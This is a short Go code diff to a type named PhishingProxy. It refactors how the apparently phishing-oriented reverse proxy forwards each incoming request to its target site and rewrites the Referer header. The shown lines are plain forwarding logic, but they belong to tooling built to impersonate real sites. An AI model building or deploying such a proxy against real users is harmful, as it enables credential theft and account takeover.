@@ -104,12 +104,13 @@ func (p *PhishingProxy) HandleConnection(conn net.Conn, transactions chan<- *HTT
 		return
 	}
 
-	request.Header.Set("Referer", strings.Replace(request.Referer(), request.Host, p.targetURL.Host, -1))
-	request.URL.Scheme = p.targetURL.Scheme
-	request.URL.Host = p.targetURL.Host
-	request.Host = p.targetURL.Host
-	request.RequestURI = ""
-	resp, err := p.client.Do(request)
+	target := request.URL
+	target.Scheme = p.targetURL.Scheme
+	target.Host = p.targetURL.Host
+
+	req, _ := http.NewRequest(request.Method, target.String(), request.Body)
+	req.Header.Set("Referer", strings.Replace(request.Referer(), request.Host, p.targetURL.Host, -1))
+	resp, err := p.client.Do(req)
 	if err != nil {
 		log.Println("Proxy error:", err.Error())
 		return
